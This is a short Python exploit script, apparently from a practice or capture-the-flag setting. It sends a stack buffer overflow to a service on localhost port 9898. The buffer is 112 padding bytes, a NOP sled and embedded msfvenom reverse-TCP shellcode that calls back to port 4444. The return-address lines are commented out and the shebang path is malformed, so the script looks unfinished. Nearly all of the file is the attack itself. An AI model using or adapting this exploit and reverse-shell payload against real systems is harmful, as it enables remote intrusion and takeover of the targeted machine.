#!/bin/usr/env python3
import sys, socket

ip = "127.0.0.1"
port = 9898

As = 'A' * 112
Bs = 'B' * 4
retn = "\x55\x9d\x04\x08" # 0x08049d55 0x804abd8 0xf7ffd499
retn = "\x99\xd4\xff\xf7" # 0x08049d55 0x804abd8 0xf7ffd499
nops = "\x90" * 16

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -b '\x00'
shellcode = ("\xbd\x2b\xad\x72\xe9\xdd\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x12\x31\x6a\x12\x83\xc2\x04\x03\x41\xa3\x90\x1c\xa4"
"\x60\xa3\x3c\x95\xd5\x1f\xa9\x1b\x53\x7e\x9d\x7d\xae\x01"
"\x4d\xd8\x80\x3d\xbf\x5a\xa9\x38\xc6\x32\x20\xf6\x38\x9a"
"\x5c\x0a\x39\x0b\xc1\x83\xd8\x9b\x9f\xc3\x4b\x88\xec\xe7"
"\xe2\xcf\xde\x68\xa6\x67\x8f\x47\x34\x1f\x27\xb7\x95\xbd"
"\xde\x4e\x0a\x13\x72\xd8\x2c\x23\x7f\x17\x2e")

buffer = ""
buffer += As
#buffer += Bs
#buffer += retn
buffer += nops
buffer += shellcode

#08049182

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip, port))
		print(s.recv(1024).decode("UTF-8"))
		print("\nSending Payload::")
		print((s.send(bytes(buffer, "latin-1"))))
except:
	print("Error occured")
	s.close()